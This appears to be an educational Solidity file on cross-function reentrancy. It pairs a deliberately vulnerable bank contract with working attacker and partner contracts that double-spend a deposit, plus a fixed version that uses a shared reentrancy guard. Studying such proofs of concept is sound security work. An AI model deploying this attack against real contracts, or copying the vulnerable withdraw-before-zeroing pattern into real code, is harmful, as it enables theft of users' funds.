// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/* ===========================================================================
   VARIANT 2 — CROSS-FUNCTION REENTRANCY
   ---------------------------------------------------------------------------
   The trick: withdrawAll() and transfer() SHARE the same balance mapping.
   During withdrawAll()'s callback we call the OTHER function, transfer(), while
   our balance has not yet been zeroed — moving it to a partner account, then
   cashing that out too. We spend the same deposit twice.

   
     1. Deploy VulnerableBank. Honest accounts deposit() 5 ETH total.
     2. Deploy CrossFnAttacker(bank) and Partner(bank); attacker.setPartner(partner).
     3. attacker.seedAndAttack() with 1 ETH.
     4. partner.cashOut().
     5. Show attacker + partner now hold ~2 ETH from a 1 ETH deposit.
     6. Repeat against SafeBank -> the reentrant transfer() reverts (shared lock).

   KEY LESSON: a guard on ONE function is not enough. The mutex must be shared
   across EVERY function that touches the same state.
   =========================================================================== */

interface IBank {
    function deposit() external payable;
    function withdrawAll() external;
    function transfer(address to, uint256 amount) external;
    function balanceOf(address who) external view returns (uint256);
}

/* ----------------------------- VULNERABLE -------------------------------- */
contract VulnerableBank is IBank {
    mapping(address => uint256) public balanceOf;

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    // BUG: pays out before zeroing (not CEI) AND shares state with transfer().
    function withdrawAll() external {
        uint256 amount = balanceOf[msg.sender];
        require(amount > 0, "zero balance");
        
        (bool ok, ) = msg.sender.call{value: amount}("");   // callback happens here
        require(ok, "send failed");
        balanceOf[msg.sender] = 0;
    }

    // Reachable during the callback while our balance is still non-zero.
    function transfer(address to, uint256 amount) external {
        require(balanceOf[msg.sender] >= amount, "insufficient");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
    }
}

/* ------------------------------ ATTACKER --------------------------------- */
contract CrossFnAttacker {
    IBank public immutable bank;
    address public partner;
    bool private reentered;

    constructor(address bankAddress) {
        bank = IBank(bankAddress);
    }

    function setPartner(address p) external {
        partner = p;
    }

    function seedAndAttack() external payable {
        require(msg.value > 0, "seed with ETH");
        bank.deposit{value: msg.value}();
        bank.withdrawAll();          // triggers receive() -> transfer to partner
    }

    receive() external payable {
        if (!reentered) {
            reentered = true;
            // Move our still-non-zero ledger balance to the partner.
            // Low-level call so a revert in the SAFE version is ignored and the
            // withdrawal still completes (attacker simply gets no extra funds).
            uint256 stale = bank.balanceOf(address(this));
            (bool ok, ) = address(bank).call(
                abi.encodeWithSignature("transfer(address,uint256)", partner, stale)
            );
            if (!ok) { /* SAFE version reverts here — ignored for this PoC */ }
        }
    }

    function sweep(address to) external {
        (bool ok, ) = to.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }
}

// A second attacker-controlled account that cashes out the transferred balance.
contract Partner {
    IBank public immutable bank;

    constructor(address bankAddress) {
        bank = IBank(bankAddress);
    }

    function cashOut() external {
        bank.withdrawAll();
    }

    receive() external payable {}
}

/* ------------------------- DEFENSE (mutex) ------------------------------- */
abstract contract ReentrancyGuard {
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;
    uint256 private _status = _NOT_ENTERED;

    modifier nonReentrant() {
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
        _status = _ENTERED;
        _;
        _status = _NOT_ENTERED;
    }
}

/* ------------------------------- SAFE ------------------------------------ */
// The SAME guard protects BOTH functions: entering transfer() while withdrawAll()
// holds the lock reverts. (In production, also apply CEI to withdrawAll.)
contract SafeBank is IBank, ReentrancyGuard {
    mapping(address => uint256) public balanceOf;

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    function withdrawAll() external nonReentrant {
        uint256 amount = balanceOf[msg.sender];
        require(amount > 0, "zero balance");
        balanceOf[msg.sender] = 0;                          // CEI as well
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "send failed");
    }

    function transfer(address to, uint256 amount) external nonReentrant {
        require(balanceOf[msg.sender] >= amount, "insufficient");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
    }
}
